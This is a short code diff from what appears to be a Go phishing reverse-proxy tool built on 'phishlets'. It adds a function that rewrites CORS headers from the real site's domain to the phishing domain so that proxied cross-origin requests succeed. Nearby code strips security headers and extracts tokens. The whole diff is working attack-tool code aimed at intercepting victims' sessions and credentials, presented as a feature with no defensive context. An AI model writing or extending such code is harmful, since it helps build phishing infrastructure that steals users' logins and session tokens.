@@ -32,6 +32,21 @@ func (c *connection) stripSecurityHeaders(resp *http.Response) {
 	}
 }
 
+// rewriteCORSHeaders rewrites Access-Control-Allow-Origin from the upstream
+// domain to the phishing domain so cross-origin requests work through the proxy.
+func (c *connection) rewriteCORSHeaders(resp *http.Response) {
+	origin := resp.Header.Get("Access-Control-Allow-Origin")
+	if origin == "" || origin == "*" {
+		return
+	}
+	for _, ph := range c.phishlet.ProxyHosts {
+		upstream := ph.OriginHost()
+		phish := ph.PhishHost(c.phishlet.BaseDomain)
+		origin = strings.ReplaceAll(origin, upstream, phish)
+	}
+	resp.Header.Set("Access-Control-Allow-Origin", origin)
+}
+
 const temporaryWhitelistDuration = 10 * time.Minute
 
 func (c *connection) extractTokens(resp *http.Response) {
